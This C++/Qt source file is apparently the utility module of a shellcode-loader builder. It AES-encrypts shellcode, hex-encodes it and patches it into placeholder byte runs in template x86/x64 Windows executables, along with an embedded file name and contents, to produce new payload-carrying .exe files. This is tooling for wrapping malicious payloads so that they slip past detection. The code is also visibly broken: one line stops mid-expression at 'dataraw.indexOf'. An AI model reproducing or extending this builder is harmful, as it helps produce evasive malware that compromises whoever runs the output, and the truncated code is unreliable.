#include <QFile>
#include <QProcess>
#include <QString>
#include <QTextStream>
#include <qmessagebox.h>
#include <string.h>
#include <QCryptographicHash>
#include <QDateTime>
#include "Rijndael.h"
#include <QDir>
#include <QTextCodec>
#include <qdebug.h>
#include <windows.h>
#define SHELLCODELEN 4096

#ifndef UTIL_H
#define UTIL_H

#endif 


QByteArray loadFile(QString filename) {
    QByteArray filecontent;

    QFile file(filename);
    if (file.open(QIODevice::ReadOnly))
    {
        filecontent = file.readAll();
        file.close();
    }

    return filecontent;
}

void writeFiledata(QString filename, QByteArray filedata) {
    QFile file(filename);
    file.open(QIODevice::WriteOnly);
    QByteArray str = filedata;
    file.write(str);
    file.close();

}


string EncryptionAES(const string shellcoderaw)
{
    string encrpt_string = encryt(shellcoderaw);

    return encrpt_string;
}
string DecryptionAES(const string shellcodeencrypt)
{
    string decrpt_string = decryt(shellcodeencrypt);
    return decrpt_string;
}


void writeFiledata(QByteArray filedata) {
    QFile file("c:/a.txt");
    file.open(QIODevice::ReadWrite | QIODevice::Text);
    QByteArray str = filedata;
    file.write(str);
    file.close();

}

void writeFiledata(QString filedata) {
    QFile file;
    file.setFileName("C:/3.txt");
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream stream(&file);
        stream << filedata << "\n";
        file.close();
    }
}

size_t ConvertHexStrToInt(const char* hex_str, size_t length)
{
    size_t sum = 0;
    for (size_t i = 0; i < length; ++i)
    {
        int asc = (int)hex_str[i];
        size_t r1 = (asc & 0x40) ? (asc & 0x0F) + 0x9 : (asc & 0x0F);
        sum += (r1 * pow(16, length - i - 1));
    }
    return sum;
}

uint8_t* ConvertToBinBuf(const char* hex_str, size_t* buf_size)
{
    if (!hex_str)
    {
        *buf_size = 0;
        return NULL;
    }

    size_t len = strlen(hex_str);
    assert(!(len % 2));

    *buf_size = len / 2;
    uint8_t* buf = (uint8_t*)malloc(*buf_size);

    for (size_t i = 0, j = 0; i < len; i += 2, ++j)
    {
        uint8_t value = (uint8_t)ConvertHexStrToInt(hex_str + i, 2);
        buf[j] = value;
    }
    return buf;
}

QString toHexadecimal(const QByteArray& byteArray)
{
    QString str;
    for (int i = 0; i < byteArray.length(); i++) {
        QString byteStr = QString::number(static_cast<uchar>(byteArray[i]), 16);
        if (byteStr.length() == 1) str += "0" + byteStr;
        else str += byteStr;
    }
    return str;
}

void compileExe(string encrypt_string, QString filepath, string pandingData, string filenameString, string EncryptFilecontent) {

    QByteArray dataarray = loadFile(filepath);
    QString DataAsString = QString(dataarray);
    QString dataraw = toHexadecimal(dataarray);

    writeFiledata(dataraw);


    QString encrypt_qstring = QString::fromStdString(encrypt_string);
    QByteArray encrypt_data_array = encrypt_qstring.toUtf8();
    QString encrypt_hex = toHexadecimal(encrypt_data_array);

    int datalen = dataraw.indexOf
    dataraw.replace(datalen, encrypt_hex.length(), encrypt_hex);

    QString tempstring2 = QString::fromStdString(pandingData);
    QByteArray temparray2 = tempstring2.toUtf8();
    QString temphex2 = toHexadecimal(temparray2);

    int templen = dataraw.indexOf("41414141414141414141414141414141414141414141414141414141414141");
    dataraw.replace(templen, temphex2.length(), temphex2);


    if (filenameString.length() > 0 && !filenameString.empty()) {
        if (EncryptFilecontent.length() > 0 && !EncryptFilecontent.empty()) {

            QString tempstring = QString::fromStdString(filenameString);
            QTextCodec* codec = QTextCodec::codecForName("GBK");
            QByteArray temparray = codec->fromUnicode(tempstring);
            QString temphex = toHexadecimal(temparray);

            int templen = dataraw.lastIndexOf("48484848484848484848484848484848484848484848484848484848484848484848484848484848484848484848484848");
            dataraw.replace(templen, temphex.length(), temphex);


            QString tempstring1 = QString::fromStdString(EncryptFilecontent);
            QByteArray temparray1 = tempstring1.toUtf8();
            QString temphex1 = toHexadecimal(temparray1);

            int templen1 = dataraw.indexOf("4747474747474747474747474747474747474747474747474747474747474747474747474747474747474747474747474747");
            dataraw.replace(templen1, temphex1.length(), temphex1);
        }
    }


    char* str;
    std::string filenamestr = filepath.toStdString();
    const char* filenamechar = filenamestr.c_str();
    QByteArray ba = dataraw.toLatin1();
    str = ba.data();
    FILE* file = fopen(filenamechar, "wb");
    assert(file);
    size_t len = 0;
    uint8_t* buf2 = ConvertToBinBuf(str, &len);
    fwrite(buf2, 1, len, file);
    free(buf2);
    fclose(file);

    dataraw = "";
    EncryptFilecontent = "";
    encrypt_string = "";
}

bool compile(string encrypt_string, bool isX64, string pandingData, string filenameString, string EncryptFilecontent) {

    QString currentPath = "";


    if (isX64) {
        currentPath = QDir::currentPath() + "/template/x64/";
    }
    else {
        currentPath = QDir::currentPath() + "/template/x86/";
    }


    QDir dir(currentPath);
    if (dir.exists())
    {
        QStringList dir_list = dir.entryList(QDir::Dirs | QDir::NoDotAndDotDot);
        QStringList file_list = dir.entryList(QDir::Files | QDir::NoDotAndDotDot);
        QStringList nameFilters;
        nameFilters << "*.exe";
        QStringList file_list_spec = dir.entryList(nameFilters, QDir::Files | QDir::NoDotAndDotDot);
        for (int i = 0; i < file_list_spec.length(); i++) {
            QString filepath = QDir::currentPath() + "/template/outfile/" + file_list_spec[i];
            QFile::copy(currentPath + file_list_spec[i], filepath);

            compileExe(encrypt_string, filepath, pandingData, filenameString, EncryptFilecontent);
        }
    }

    return true;
}